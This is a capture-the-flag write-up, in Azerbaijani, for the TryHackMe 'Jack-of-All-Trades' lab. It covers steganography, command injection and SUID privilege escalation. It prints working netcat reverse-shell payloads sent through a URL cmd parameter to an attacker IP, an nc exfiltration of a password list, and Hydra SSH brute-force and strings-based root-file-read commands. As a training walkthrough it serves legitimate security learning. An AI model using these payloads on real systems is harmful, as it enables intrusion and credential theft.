# 🚩 TryHackMe – Jack-of-All-Trades CTF | Azərbaycanca Write-up

> **Room:** [Jack-of-All-Trades](https://tryhackme.com/room/jackofalltrades)  
> **Çətinlik:** Asan  
> **Kateqoriya:** Port Qarışıqlığı, Steganography, Base64, Command Injection, Hydra, SUID  
> **Məqsəd:** User flag və Root flag əldə etmək  
> **Orijinal:** Securi-Tay 2020 CTF yarışması üçün hazırlanmışdır

---

## 📖 Ümumi Baxış

Bu CTF tapşırığında klassik port konfiqurasiyası tamamilə tərsinə çevrilib — SSH port 80-də, HTTP isə port 22-də işləyir! Bundan əlavə steganography, Base64 deşifrəsi, command injection və SUID binary exploit-i istifadə olunur.

### Hücum Zənciri:
```
Nmap skan
    ↓
Port 22 = HTTP, Port 80 = SSH (tərsinə!)
    ↓
Firefox ayarı ilə port 22-yə giriş
    ↓
Mənbə kodu → Base64 şifrəsi → şifrə + istifadəçi adı
    ↓
/recovery.php → mənbə kodunda Base64 → password siyahısı
    ↓
/assets/ → stego.jpg (rabbit hole) → header.jpg → steghide → creds.txt
    ↓
recovery.php-yə login → Command Injection
    ↓
Netcat reverse shell → www-data
    ↓
/home/jack/id_rsa şifrə siyahısı → Hydra → jack şifrəsi
    ↓
SSH ilə jack → user.jpg → strings → user flag
    ↓
SUID: strings binary → root flag 🏆
```

---

## 🔎 Mərhələ 1: Nmap ilə Port Skan

### Nmap nədir?
**Nmap** — şəbəkədə açıq portları və işləyən xidmətləri aşkar edən kəşfiyyat alətidir.

### Əmr:
```bash
nmap -sC -sV <HEDEF-IP>
```

### Gözlənilməz Nəticə:
```
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 (Debian)
80/tcp open  ssh     OpenSSH 6.7p1 Debian
```

**⚠️ Diqqət!** Port 22-də HTTP (veb server), port 80-də isə SSH işləyir — bu tamamilə tərsinədir! Bu qəsdən edilib — CTF çətinliyinin bir hissəsidir.

**Nəticədən nə öyrəndik:**
- Veb sayta **port 22**-dən daxil olmaq lazımdır
- SSH bağlantısı üçün **port 80** istifadə olunacaq

---

## 🌐 Mərhələ 2: Firefox ilə Port 22-yə Giriş

Brauzer normada port 22-yə giriş etməyə **icazə vermir** — bu port SSH üçün ayrılıb. Firefox onu bloklayır.

### Firefox-da port 22-yi icazəli et:

1. Firefox ünvan çubuğuna yaz: `about:config`
2. "Accept the Risk" düyməsinə bas
3. Axtarışa yaz: `network.security.ports.banned.override`
4. **String** tipini seç → `+` düyməsinə bas
5. Dəyər olaraq `22` yaz → OK

İndi `http://<HEDEF-IP>:22` ünvanına daxil ola bilərsən!

### network.security.ports.banned.override nədir?
Firefox təhlükəsizlik məqsədilə standart olmayan portlara (22, 25, 110 və s.) girişi bloklayır. Bu ayar həmin bloku aradan qaldırır.

---

## 🕵️ Mərhələ 3: Mənbə Kodunda Gizli Base64

`http://<HEDEF-IP>:22` ünvanında Jack-in veb saytı görünür. Mənbə koduna bax (`Ctrl+U`):

```html
<!-- UmVtZW1iZXIgdG8gd2lzaCBKb2... (uzun Base64 string) -->
```

Həmçinin mənbə kodunda:
- 3 şəkil faylı (`/assets/` qovluğunda)
- Gizli qovluq: `/recovery.php`

### Base64 nədir?
**Base64** — binary məlumatı mətn formatına çevirmək üçün istifadə edilən bir kodlama sistemidir. `=` işarəsi ilə bitən uzun hərfli mətnlər Base64 olduğuna işarədir.

### Base64 deşifrə et:
```bash
echo "UmVtZW1iZXIgdG8gd2lzaCBKb2hueS..." | base64 -d
```

**Nəticə:**
```
Remember to wish Johny Graves well with his crypto jobhunting!
His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

🎯 **Şifrə tapıldı: `u?WtKSraq`** (amma kimin şifrəsi olduğu hələ bəlli deyil)

---

## 🔑 Mərhələ 4: /recovery.php — Login Səhifəsi

`http://<HEDEF-IP>:22/recovery.php` — login formu görünür.

Mənbə koduna bax — orada da Base64 var:

```bash
echo "GQ2GK3DEEHYGK3D..." | base64 -d
# Əgər birbaşa açılmırsa — çoxqatlı şifrədir
```

Bu dəfə nəticə dərhal açılmır — əlavə deşifrə lazımdır (Base32, ROT13 və s. kombinasiyası). [CyberChef](https://gchq.github.io/CyberChef/) istifadə et — "Magic" rejimi avtomatik tapacaq.

**Nəticə:** İstifadəçi adları siyahısı:
```
jack
ojrosey
...
```

---

## 📂 Mərhələ 5: /assets/ Qovluğu və Steganography

Gobuster ilə qovluqları tara:
```bash
gobuster dir -u http://<HEDEF-IP>:22 -w /usr/share/wordlists/dirb/common.txt
```

**Tapılan:** `/assets/` qovluğu

Qovluqda şəkillər var:
- `stego.jpg`
- `header.jpg`
- `jackinthebox.jpg`

### stego.jpg — Rabbit Hole!
```bash
wget http://<HEDEF-IP>:22/assets/stego.jpg
steghide extract -sf stego.jpg
# Passphrase: u?WtKSraq
```

**Nəticə:** `creds.txt` — amma içi boş ya da yanlış məlumatdır (rabbit hole — yanlış iz!).

### Rabbit Hole nədir?
CTF-lərdə qəsdən qoyulan **yanlış izlərdir** — vaxtını itirirsən amma nəticə yoxdur. Diqqətli ol!

### header.jpg — Əsl tapıntı!
```bash
wget http://<HEDEF-IP>:22/assets/header.jpg
steghide extract -sf header.jpg
# Passphrase: u?WtKSraq
```

**Nəticə:** `creds.txt` çıxarıldı:
```
jack:*axA&GF8dP
```

🎯 **Kredensiallar tapıldı!**

---

## 🔐 Mərhələ 6: recovery.php-yə Login

```
http://<HEDEF-IP>:22/recovery.php
Username: jack
Password: *axA&GF8dP
```

Daxil olduqdan sonra bir **komanda girişi (command input)** formu görünür:

```
GET me a 'cmd' and I'll run it for you Future-Jack.
```

Bu **Command Injection** zəifliyidir!

### Command Injection nədir?
Veb applikasiya istifadəçidən gələn məlumatı birbaşa sistem əmri kimi icra edir. Bu, hücumçuya serverda istənilən əmri işlətməyə imkan verir.

### Yoxla:
```
http://<HEDEF-IP>:22/recovery.php?cmd=id
```

**Nəticə:** `uid=33(www-data)` — əmr işləyir!

---

## 💻 Mərhələ 7: Reverse Shell

### Reverse Shell nədir?
**Reverse shell** — hədəf serverin bizim maşınımıza özü bağlandığı bir əks bağlantıdır. Normal shell-də biz serverə qoşuluruq; reverse shell-də isə server bizə qoşulur — bu firewall-ları keçməyə kömək edir.

### Addım 1 — Kali-də dinləyici aç:
```bash
nc -lvnp 4444
```

### Addım 2 — Reverse shell göndər:
```
http://<HEDEF-IP>:22/recovery.php?cmd=nc <KALI-IP> 4444 -e /bin/bash
```

Əgər `-e` işləməsə:
```
http://<HEDEF-IP>:22/recovery.php?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI-IP> 4444 >/tmp/f
```

**Nəticə:** `www-data` olaraq shell aldıq!

### Shell-i oxunaqlı et:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## 🔍 Mərhələ 8: Sistemdə Araşdırma

```bash
ls /home/
# jack qovluğu var

cat /home/jack/jacks_password_list
```

**Nəticə:** Jack-in mümkün şifrələri siyahısı tapıldı!

```
*axA&GF8dP
baksteen
...
(uzun siyahı)
```

Bu siyahını Kali-yə kopyala:
```bash
# Kali-də
nc -lvnp 5555 > passwords.txt

# Hədəf serverdə
cat /home/jack/jacks_password_list | nc <KALI-IP> 5555
```

---

## 🔨 Mərhələ 9: Hydra ilə SSH Brute Force

### Hydra nədir?
**Hydra** — SSH, FTP, HTTP və digər protokollar üçün şifrə brute force alətidir. Bir istifadəçi adı ilə çoxlu şifrəni avtomatik sınayır.

### Əmr:
```bash
hydra -l jack -P passwords.txt ssh://<HEDEF-IP>:80
```

### Parametrlərin izahı:
| Parametr | Nə edir? |
|----------|----------|
| `-l jack` | İstifadəçi adı |
| `-P passwords.txt` | Şifrə siyahısı faylı |
| `ssh://IP:80` | SSH port 80-dədir! |

**Nəticə:**
```
[80][ssh] host: <IP>  login: jack  password: ITMJpGGIqg1jn?QO
```

🎯 **Jack-in şifrəsi tapıldı!**

---

## 🔐 Mərhələ 10: SSH ilə Jack kimi Daxil Olmaq

```bash
ssh jack@<HEDEF-IP> -p 80
# Şifrə: ITMJpGGIqg1jn?QO
```

Daxil olduq! ✅

---

## 📜 Mərhələ 11: User Flag — Şəkildən!

```bash
ls
# user.jpg görünür — user.txt deyil!
```

**user.jpg** — user flag şəkil içindədir!

### Şəkili Kali-yə köçür:

**Hədəf serverdə:**
```bash
python3 -m http.server 9999
```

**Kali-də:**
```bash
wget http://<HEDEF-IP>:9999/user.jpg
```

### Şəkili analiz et:
```bash
strings user.jpg | grep -i "thm\|flag\|{"
```

**Nəticə:**
```
THM{...user_flag...}
```

✅ **User flag alındı!**

---

## 🧪 Mərhələ 12: SUID Binary Axtarışı

```bash
sudo -l
# İcazə yoxdur

find / -type f -perm -04000 -ls 2>/dev/null
```

**Tapılan:**
```
/usr/bin/strings
```

**`strings`** binary-nin SUID biti var — bu qeyri-adidir!

### SUID strings nədir?
Normada `strings` sadə bir alətdir — fayl içindəki oxunaqlı mətni göstərir. Amma SUID biti ilə **root kimi işləyir** — yəni root-a məxsus faylları da oxuya bilər!

---

## ⚡ Mərhələ 13: Root Flag — strings ilə

### GTFOBins metodu:
```bash
strings /root/root.txt
```

SUID sayəsində `/root/root.txt` faylını root icazəsi olmadan oxuya bilirik!

**Nəticə:**
```
THM{...root_flag...}
```

✅ **Root flag alındı! Sistem tam ələ keçirildi! 🏆**

---

## ✅ Xülasə Cədvəli

| Mərhələ | Alət | Tapıntı |
|---------|------|---------|
| Port Skan | Nmap | Port 22=HTTP, Port 80=SSH (tərsinə!) |
| Firefox Ayarı | about:config | Port 22-yə giriş açıldı |
| Mənbə Kodu | Brauzer | Base64 string → şifrə: `u?WtKSraq` |
| /recovery.php | Brauzer | Login səhifəsi tapıldı |
| Qovluq Tarama | Gobuster | `/assets/` tapıldı |
| Steganography | steghide | `header.jpg` → `creds.txt` → `jack:*axA&GF8dP` |
| Login | recovery.php | Command Injection zəifliyi |
| Reverse Shell | netcat | `www-data` shell alındı |
| Şifrə Siyahısı | cat | `/home/jack/jacks_password_list` |
| Brute Force | Hydra | `jack:ITMJpGGIqg1jn?QO` |
| SSH Girişi | SSH port 80 | Jack kimi daxil olundu |
| User Flag | strings/görüntü | `user.jpg` içindən tapıldı |
| SUID Axtarışı | find | `/usr/bin/strings` SUID var |
| Root Flag | strings | `/root/root.txt` oxundu |

---

## 🎓 Öyrənilən Dərslər

1. **Port skanı həmişə et** — standart portlar dəyişdirilmiş ola bilər (bu tapşırıqda SSH↔HTTP tamamilə yer dəyişdi)
2. **Firefox/brauzer məhdudiyyətlərini bil** — `about:config` ilə bloklanmış portları aça bilərsən
3. **Mənbə kodunu həmişə oxu** — gizli Base64, şərhler, gizli linklər ola bilər
4. **Base64 gördükdə dərhal deşifrə et** — `=` ilə bitən uzun mətnlər Base64-dür
5. **Bütün şəkilləri steghide ilə yoxla** — steganography çox yayılmış CTF texnikasıdır
6. **Rabbit hole-lara diqqət et** — hər tapıntı düzgün iz deyil, vaxt itkisinə yol açır
7. **Command Injection-ı həmişə yoxla** — istifadəçi girişi ilə əmr işlədilən formlarda
8. **SUID binary-ləri GTFOBins-də yoxla** — `strings`, `less`, `more` kimi adi alətlər belə təhlükəli ola bilər
9. **User flag hər zaman `.txt` olmur** — şəkil, audio ya da başqa formatlarda gizlənə bilər

---

## 🔗 Faydalı Linklər

- [TryHackMe – Jack-of-All-Trades](https://tryhackme.com/room/jackofalltrades)
- [GTFOBins – strings](https://gtfobins.github.io/gtfobins/strings/)
- [CyberChef – Base64 Decoder](https://gchq.github.io/CyberChef/)
- [Hydra rəsmi sənədlər](https://github.com/vanhauser-thc/thc-hydra)

---

*Yazıldı: 2026 | Platforma: TryHackMe | Azərbaycanca*
